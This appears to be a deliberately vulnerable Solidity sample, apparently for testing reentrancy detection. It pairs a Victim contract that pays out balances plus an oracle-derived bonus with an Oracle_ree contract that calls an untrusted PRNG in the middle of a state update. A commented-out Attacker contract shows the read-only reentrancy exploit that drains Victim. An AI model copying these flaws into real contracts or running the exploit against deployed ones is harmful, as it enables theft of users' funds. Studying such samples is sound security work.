// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface IPRNG {
    function getRandom() external returns (uint256);
}

contract Victim {
    Oracle_ree public o;
    mapping (address => uint) private balances;

    constructor(address _o)  public {
        o = Oracle_ree(_o);
    }

    function withdraw() external {
        (bool success, bytes memory data) = address(o).staticcall("fix");  // static calls are equivalent to view-method invocations
        require(success, "Staticcall failed");
        uint256 fix = abi.decode(data, (uint256));
        
        (success, data) = address(o).staticcall("randomness");
        require(success, "Staticcall failed");
        uint256 randomness = abi.decode(data, (uint256));

        uint256 bonus = fix / randomness;
        uint256 amt = balances[msg.sender] + bonus;

        (success, ) = (msg.sender).call.value(amt)("");
        require (success, "Failed");
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
}

// THIS is the contract vulnerable to reentrancy
contract Oracle_ree {
    uint256 public fix;
    uint256 public randomness;

    function update(address prng, uint256 amt) external {
        fix += amt;
        uint rnd = IPRNG(prng).getRandom();
        randomness += amt + rnd;
    }
}

// contract Attacker is IPRNG {
//     Victim public v;
//     Oracle_ree public o;

//     constructor(address payable _v, address _o)  public {
//         v = Victim(_v);
//         o = Oracle_ree(_o);
//     }

//     function getRandom() external returns (uint256) {
//         v.withdraw();
//         return 1;
//     }

//     function() external payable {
//         o.update(address(this), 10);
//     }
// }
